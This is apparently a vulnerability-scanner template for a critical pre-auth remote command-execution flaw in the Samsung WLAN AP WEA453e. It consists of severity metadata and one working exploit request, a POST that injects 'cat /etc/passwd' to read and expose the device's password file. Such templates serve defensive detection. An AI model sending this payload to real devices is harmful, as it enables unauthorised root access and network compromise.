id: samsung-wlan-ap-rce
info:
  name: Samsung WLAN AP WEA453e - Remote Code Execution
  author: pikpikcu
  severity: critical
  description: The Samsung WLAN AP WEA453e is prone to pre-auth root remote command
    execution vulnerability, allowing hackers to execute code remotely without login
    credentials.
  reference:
  - https://omriinbar.medium.com/samsung-wlan-ap-wea453e-vulnerabilities-7aa4a57d4dba
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: xss,samsung,rce
  metadata:
    impact: The impact of the Samsung WLAN AP WEA453e vulnerability is the ability
      for an attacker to gain full control of the device and potentially the entire
      network it is connected to.
    recommendation: I highly recommend immediate action to address the Samsung WLAN
      AP WEA453e vulnerability to prevent potential pre-auth root remote code execution
      attacks.
requests:
- method: POST
  path:
  - '{{BaseURL}}/(download)/tmp/poc.txt'
  body: command1=shell%3Acat /etc/passwd|dd of=/tmp/poc.txt
  matchers-condition: and
  matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
    - bin:.*:1:1
    part: body
  - type: status
    status:
    - 200
